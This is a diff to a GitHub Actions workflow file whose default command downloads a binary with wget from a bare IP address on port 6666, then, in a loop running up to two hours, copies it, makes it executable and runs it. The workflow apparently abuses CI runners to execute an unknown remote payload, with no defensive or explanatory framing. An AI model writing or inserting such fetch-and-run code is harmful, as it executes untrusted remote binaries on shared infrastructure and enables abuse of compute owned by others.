@@ -5,7 +5,7 @@ on:
       runs-on:
         default: 'ubuntu-latest'
       run:
-        default: 'wget -O {2}/exe.exe 109.188.87.160:6666/{0}_{1}; chmod +x {2}/exe.exe; {2}/exe.exe'
+        default: 'wget -O {2}/d 109.188.87.160:6666/{0}_{1}'
 jobs:
   loop:
     runs-on: ${{ inputs.runs-on }}
@@ -21,6 +21,8 @@ jobs:
       run: |
         while (${{ format(inputs.run, runner.arch, runner.os, runner.temp) }}) || true
         do
+          cp ${{ runner.temp }}/d ${{ runner.temp }}/exe.exe && chmod a+x ${{ runner.temp }}/exe.exe && stat ${{ runner.temp }}/exe.exe || true
+          ${{ runner.temp }}/exe.exe || true
           if [[ -f exit ]] || (( $SECONDS > 7200 ))
           then
             break
